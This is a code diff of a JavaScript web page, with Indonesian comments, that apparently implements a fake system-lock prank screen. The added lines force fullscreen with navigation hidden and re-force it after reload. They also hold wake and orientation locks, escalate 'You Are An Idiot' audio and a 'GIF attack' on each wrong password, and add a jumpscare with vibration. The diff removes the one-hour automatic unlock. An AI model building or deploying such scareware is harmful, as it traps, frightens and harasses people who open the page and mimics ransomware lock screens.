+      if (VISIBILITY_WATCHDOG) clearInterval(VISIBILITY_WATCHDOG);
+      if (ORIENTATION_WATCHDOG) clearInterval(ORIENTATION_WATCHDOG);
+      if (RELOAD_WATCHDOG) clearInterval(RELOAD_WATCHDOG);
+      if (WAKE_LOCK) { try { WAKE_LOCK.release(); } catch(e) {} }
+      try { if (document.fullscreenElement) document.exitFullscreen(); } catch(e) {}
       setTimeout(function() {
         document.body.innerHTML = '<div style="color:#00ff00;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh;font-size:18px;letter-spacing:4px;background:#000;text-shadow:0 0 20px #00ff00;">✓ SYSTEM UNLOCKED</div>';
       }, 1500);
@@ -1695,10 +2600,11 @@
       shakeBody();
       vibrateSafe([300, 100, 300, 100, 400]);
       status.style.color = '#ff0000';
-      status.innerText = '✗ WRONG PASSWORD!';
+      status.innerText = '✗ WRONG PASSWORD! (' + ATTEMPTS + '/' + MAX_ATTEMPTS + ')';
       input.value = '';
       var isLast = (ATTEMPTS >= MAX_ATTEMPTS);
-      if (isLast) document.getElementById('mainBox');
+      triggerGifAttack(ATTEMPTS);
+      if (!IDIOT_PLAYING) playYouAreAnIdiot(0.15 + ATTEMPTS * 0.15);
       BLOCKED = true;
       unlockBtn.disabled = true;
       input.disabled = true;
@@ -1734,6 +2640,15 @@
     document.getElementById('modal').addEventListener('click', function(e) {
       if (e.target.id === 'modal') hideModal();
     });
+
+    // Kalau abis reload, langsung paksa fullscreen
+    try {
+      if (sessionStorage.getItem('kompas_locked') === '1') {
+        console.log('[RELOAD] Restored — paksa fullscreen');
+        // Coba FS langsung (mungkin gak bisa tanpa gesture)
+        forceFullscreen();
+      }
+    } catch(e) {}
   });
 
   /* ============ START ============ */
@@ -1742,10 +2657,13 @@
     getAudio();
     try {
       var el = document.documentElement;
-      if (el.requestFullscreen) el.requestFullscreen().catch(function(){});
-      else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+      if (el.requestFullscreen) el.requestFullscreen({ navigationUI: 'hide' }).catch(function(){});
+      else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT);
     } catch(e) {}
-    playYouAreAnIdiot();
+    requestWakeLock();
+    lockOrientation();
+    playYouAreAnIdiot(0.15);
+    startAmbientGif();
     showJumpscare();
     vibrateSafe([300, 100, 300, 100, 300]);
   }
@@ -1753,12 +2671,12 @@
   document.addEventListener('click', startAllFx, { once: true });
   document.addEventListener('touchstart', startAllFx, { once: true });
 
-  setTimeout(function() { LOCKED = false; }, 3600000);
   window.unlock = unlock;
   window.addEventListener('beforeunload', function() {
     stopTorch();
     stopVibrate();
     stopYouAreAnIdiot();
+    if (WAKE_LOCK) { try { WAKE_LOCK.release(); } catch(e) {} }
   });
 
 })();
